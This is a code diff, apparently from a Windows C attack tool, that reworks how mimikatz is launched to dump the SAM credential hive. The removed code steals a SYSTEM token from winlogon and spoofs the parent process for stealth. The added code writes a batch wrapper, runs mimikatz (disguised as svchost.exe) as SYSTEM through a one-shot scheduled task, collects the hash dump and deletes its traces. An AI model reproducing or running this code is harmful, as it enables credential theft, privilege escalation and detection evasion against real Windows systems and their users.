@@ -43,20 +43,6 @@ static void press_exit(int code, const char* why) {
     exit(code);
 }
 
-static DWORD find_pid_by_name(const char *name) {
-    DWORD found = 0;
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
-    if (Process32First(snap, &pe)) {
-        do {
-            if (lstrcmpiA(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
-        } while (Process32Next(snap, &pe));
-    }
-    CloseHandle(snap);
-    return found;
-}
-
 /* ponytail: stage svchost.exe (mimikatz) into g_dir by downloading the
    encrypted payload.zip from our own repo and extracting in-process. Runs in
    P0wershell (elevated, long-lived) instead of msra.exe's worker thread. */
@@ -83,102 +69,75 @@ static void stage_payload(void) {
     audit("[*] Temp zip removed: %s", zipPath);
 }
 
-static void enable_priv(HANDLE tok, const char *name) {
-    LUID luid;
-    if (LookupPrivilegeValueA(NULL, name, &luid)) {
-        TOKEN_PRIVILEGES tp = { .PrivilegeCount = 1 };
-        tp.Privileges[0].Luid = luid;
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-        AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
-    }
-}
-
+/* ponytail: lsadump::sam needs SeBackupPrivilege to read HKLM\SAM. Under a
+   UAC-filtered admin token that privilege is STRIPPED (not just disabled),
+   so `privilege::backup` can't enable it -> 0x5 ACCESS_DENIED, empty dump.
+   Run mimikatz as SYSTEM via a one-shot scheduled task: SYSTEM owns the SAM
+   hive and already holds SeBackup/SeTcb, and /ru SYSTEM schtasks needs no
+   extra password. Token theft path broke (0x5 on
+   OpenProcessToken of winlogon from a high-IL admin); schtasks-as-SYSTEM
+   sidesteps it entirely and is the canonical red-team pattern. */
 static void launch_mimikatz(void) {
-    char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
+    char svchost[MAX_PATH], dump[MAX_PATH], bat[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
-    wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
-    // ponytail: lsadump::sam needs SeBackupPrivilege to read HKLM\SAM. Under a
-    // UAC-filtered admin token that privilege is STRIPPED (not just disabled),
-    // so `privilege::backup` can't enable it -> 0x5 ACCESS_DENIED, empty dump.
-    // Steal a SYSTEM token (winlogon) and run mimikatz as SYSTEM, which owns
-    // the SAM hive. PPID-spoof the SYSTEM parent for stealth.
+    wsprintfA(dump,  "%s\\sam_dump.txt", g_dir);
+    wsprintfA(bat,   "%s\\mimi.bat", g_dir);
     DeleteFileA(dump);
-    wsprintfA(cmd, "\"%s\" \"lsadump::sam\" \"exit\"", svchost);
 
-    DWORD pid = find_pid_by_name("winlogon.exe");
-    if (!pid) pid = find_pid_by_name("explorer.exe");
-    if (!pid) { audit("[-] No SYSTEM parent process found"); return; }
+    /* write a tiny wrapper batch: redirect mimikatz stdout/stderr to the dump
+       file (schtasks /tr doesn't honour shell redirection, so the batch is
+       the lazy way to capture output without a wrapper exe). */
+    FILE *bf = fopen(bat, "w");
+    if (!bf) { audit("[-] Cannot write %s", bat); return; }
+    fprintf(bf, "@\"%s\" \"lsadump::sam\" \"exit\" > \"%s\" 2>&1\r\n", svchost, dump);
+    fclose(bf);
+    audit("[+] Wrapper batch written: %s", bat);
 
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
-    if (!hProc) { audit("[-] OpenProcess(%lu) failed (%lu)", pid, GetLastError()); return; }
-
-    HANDLE hToken = NULL;
-    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
-        audit("[-] OpenProcessToken failed (%lu)", GetLastError());
-        CloseHandle(hProc); return;
+    /* create one-shot SYSTEM task. /ru SYSTEM needs no password (special
+       account). Task Scheduler service (running as SYSTEM) honors the
+       request from an elevated admin. */
+    char c[MAX_PATH * 4];
+    wsprintfA(c, "schtasks.exe /create /tn MimiDump /tr \"%s\" /ru SYSTEM /sc once /st 00:00 /f >nul 2>&1", bat);
+    if (system(c) != 0) {
+        audit("[-] schtasks /create MimiDump failed");
+        DeleteFileA(bat);
+        return;
     }
-    HANDLE hSys = NULL;
-    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hSys)) {
-        audit("[-] DuplicateTokenEx failed (%lu)", GetLastError());
-        CloseHandle(hToken); CloseHandle(hProc); return;
-    }
-    enable_priv(hSys, SE_DEBUG_NAME);
-    enable_priv(hSys, SE_BACKUP_NAME);
-    enable_priv(hSys, SE_TCB_NAME);
-    audit("[+] Got SYSTEM token from PID %lu", pid);
+    audit("[+] MimiDump task created (ru=SYSTEM)");
 
-    DWORD sess = WTSGetActiveConsoleSessionId();
-    if (sess != 0xFFFFFFFF)
-        SetTokenInformation(hSys, TokenSessionId, &sess, sizeof(sess));
-
-    SIZE_T attrSize = 0;
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
-    PPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
-    if (attrList) {
-        if (InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize) &&
-            UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL))
-            audit("[+] PPID attribute set (SYSTEM parent)");
-        else
-            audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
+    wsprintfA(c, "schtasks.exe /run /tn MimiDump >nul 2>&1");
+    if (system(c) != 0) {
+        audit("[-] schtasks /run MimiDump failed");
+        wsprintfA(c, "schtasks.exe /delete /tn MimiDump /f >nul 2>&1");
+        system(c);
+        DeleteFileA(bat);
+        return;
     }
+    audit("[+] svchost.exe (mimikatz/SYSTEM) launched via schtasks — dumping SAM -> %s", dump);
 
-    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(si) } };
-    if (attrList) si.lpAttributeList = attrList;
-    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
-    HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hOut != INVALID_HANDLE_VALUE) {
-        SetHandleInformation(hOut, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
-        si.StartupInfo.hStdOutput = hOut; si.StartupInfo.hStdError = hOut;
+    /* poll up to 60s for a non-empty dump (mimikatz streams output; SAM dump
+       is typically <5s). Bounded so we never hang forever. */
+    WIN32_FILE_ATTRIBUTE_DATA fa;
+    DWORD sz = 0;
+    for (int i = 0; i < 120; i++) {
+        Sleep(500);
+        if (GetFileAttributesExA(dump, GetFileExInfoStandard, &fa) && fa.nFileSizeLow > 0) {
+            sz = fa.nFileSizeLow;
+            /* give it a moment to finish writing and flush */
+            Sleep(2000);
+            GetFileAttributesExA(dump, GetFileExInfoStandard, &fa);
+            sz = fa.nFileSizeLow;
+            break;
+        }
     }
+    if (sz) audit("[+] SAM dump completed (%lu bytes) -> %s", sz, dump);
+    else    audit("[-] SAM dump empty (0 bytes) -> %s", dump);
 
-    PROCESS_INFORMATION pi;
-    BOOL ok = CreateProcessAsUserA(hSys, svchost, cmd, NULL, NULL, TRUE,
-                                   EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi);
-    if (!ok && attrList) {
-        // retry without PPID spoof if that was the blocker
-        si.lpAttributeList = NULL;
-        ok = CreateProcessAsUserA(hSys, svchost, cmd, NULL, NULL, TRUE,
-                                  EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi);
-    }
-    if (ok) {
-        audit("[+] svchost.exe (mimikatz/SYSTEM) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
-        CloseHandle(pi.hThread);
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        CloseHandle(pi.hProcess);
-        DWORD sz = 0; WIN32_FILE_ATTRIBUTE_DATA fa;
-        if (GetFileAttributesExA(dump, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
-        if (sz) audit("[+] SAM dump completed (%lu bytes) -> %s", sz, dump);
-        else    audit("[-] SAM dump empty (0 bytes) -> %s", dump);
-    } else {
-        audit("[-] CreateProcessAsUser svchost.exe failed (%lu)", GetLastError());
-    }
-
-    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
-    if (attrList) DeleteProcThreadAttributeList(attrList);
-    if (attrList) HeapFree(GetProcessHeap(), 0, attrList);
-    CloseHandle(hSys);
-    CloseHandle(hToken);
-    CloseHandle(hProc);
+    /* cleanup: delete the one-shot task and the wrapper batch. */
+    wsprintfA(c, "schtasks.exe /delete /tn MimiDump /f >nul 2>&1");
+    system(c);
+    DeleteFileA(bat);
+    audit("[*] MimiDump task + batch cleaned up");
 }
 
 int main(void) {
